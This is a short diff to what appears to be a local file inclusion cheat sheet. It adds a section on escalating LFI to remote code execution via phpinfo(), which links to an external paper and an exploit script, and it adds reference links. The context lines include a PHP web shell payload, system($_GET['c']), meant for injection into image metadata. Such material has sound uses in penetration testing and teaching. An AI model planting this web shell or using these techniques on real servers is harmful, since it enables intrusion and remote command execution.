@@ -87,7 +87,13 @@ http://example.com/index.php?page=path/to/uploaded/file.png
 ```
 You can injected the <?php system($_GET['c']); ?> into the metadata
 
+## LFI to RCE via Phpinfo()
+https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
+Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
+
+
 ## Thanks to
 * [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
 * [HighOn.coffee LFI Cheat](https://highon.coffee/blog/lfi-cheat-sheet/)
 * [Turning LFI to RFI ](https://l.avala.mp/?p=241)
+* [Is PHP vulnerable and under what conditions?](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
